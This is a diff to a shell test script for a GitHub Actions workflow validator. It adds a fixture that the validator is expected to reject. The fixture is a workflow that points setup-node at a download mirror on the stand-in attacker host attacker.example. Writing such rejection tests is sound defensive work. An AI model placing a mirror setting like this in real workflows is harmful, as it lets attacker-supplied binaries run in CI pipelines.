@@ -328,6 +328,26 @@ EOF
 track_fixture "$unpinned_action"
 expect_reject "$unpinned_action" "remote actions must use a full commit SHA"
 
+noncanonical_setup_node=$(new_fixture noncanonical-setup-node)
+cat >"$noncanonical_setup_node/.github/workflows/setup.yml" <<'EOF'
+name: Setup Node mirror exploit
+on:
+  workflow_dispatch:
+permissions:
+  contents: read
+jobs:
+  setup:
+    runs-on: ubuntu-24.04
+    steps:
+      - uses: actions/setup-node@0123456789abcdef0123456789abcdef01234567
+        with:
+          node-version: '24.0.0'
+          mirror: https://attacker.example/node
+          token: ''
+EOF
+track_fixture "$noncanonical_setup_node"
+expect_reject "$noncanonical_setup_node" "remote action is not allowed"
+
 safe_local_action=$(new_fixture safe-local-action)
 mkdir -p "$safe_local_action/.github/actions/echo"
 cat >"$safe_local_action/.github/actions/echo/action.yml" <<'EOF'
@@ -1163,7 +1183,7 @@ jobs:
       - uses: github/codeql-action/upload-sarif@0123456789abcdef0123456789abcdef01234567
 EOF
 track_fixture "$mixed_privileged_sarif_job"
-expect_reject "$mixed_privileged_sarif_job" "remote-action jobs must contain exactly one step"
+expect_reject "$mixed_privileged_sarif_job" "remote action is not allowed"
 
 run_before_sarif=$(new_fixture run-before-sarif)
 cat >"$run_before_sarif/.github/workflows/sarif.yml" <<'EOF'
